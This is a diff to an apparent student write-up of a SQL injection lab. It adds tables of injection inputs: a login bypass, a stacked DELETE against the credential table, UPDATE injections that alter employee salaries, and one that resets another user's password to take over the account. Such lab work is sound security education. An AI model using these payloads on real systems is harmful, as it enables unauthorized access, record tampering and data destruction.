@@ -21,6 +21,11 @@ By passing `admin' or'=` as the username and anything as the password we success
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1044217583706054666/image.png">
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1044217714153111583/image.png">
 
+| Field | Input |
+| --- | --- |
+| username | admin' or'= |
+| password | abc |
+
 #### Task 2.2
 
 Similarly, one can achieve the same exact result using curl and basic knowledge of HTTP requests, without the need for a Web interface. <br>
@@ -28,6 +33,7 @@ All we needed was to encode the special characters in our payload (`admin' or '=
 
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045412814539456512/image.png">
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045412960232820736/image.png">
+
 
 #### Task 2.3
 
@@ -38,6 +44,11 @@ Following this logic, our username input could be something like `admin';DELETE 
 (Un)fortunately, [mysql_query() doesn't allow running more than one statement](https://www.php.net/manual/en/function.mysql-query.php#description), which means our payload will have no effect on the database.
 
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045417693467119646/image.png">
+
+| Field | Input |
+| --- | --- |
+| username | admin';DELETE * FROM credential;# |
+| password | abc |
 
 ### Task 3
 #### Task 3.1
@@ -52,6 +63,11 @@ Knowing that the original salary for Alice was 20.000, after sending our payload
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045425127854178355/image.png">
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045424714622967959/image.png">
 
+| Field | Input |
+| --- | --- |
+| Phone Number | ', salary='9999999 |
+
+
 #### Task 3.2
 
 At this point it's just a matter of playing around with everything we've done so far. <br>
@@ -60,7 +76,21 @@ In this task, since we want to change Boby's salary to 1 and we're originally up
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045426122097164438/image.png">
 <img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045426258344939552/image.png">
 
+| Field | Input |
+| --- | --- |
+| Phone Number | ', salary='1' WHERE Name = 'Boby';# |
+
 #### Task 3.3
+
+As per last task, we just selected Boby's info using a WHERE clause, and changed his password to `myaccountnow`, guaranteeing that we have access over Boby's account and he doesn't.
+
+<img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045428633206001704/image.png">
+<img src="https://cdn.discordapp.com/attachments/1021902913079103488/1045428657415520256/image.png">
+
+| Field | Input |
+| --- | --- |
+| Phone Number | 'WHERE Name = 'Boby';# |
+| Password | myaccountnow |
 
 ## Week 8 CTF Challenge
 ### Challenge 1
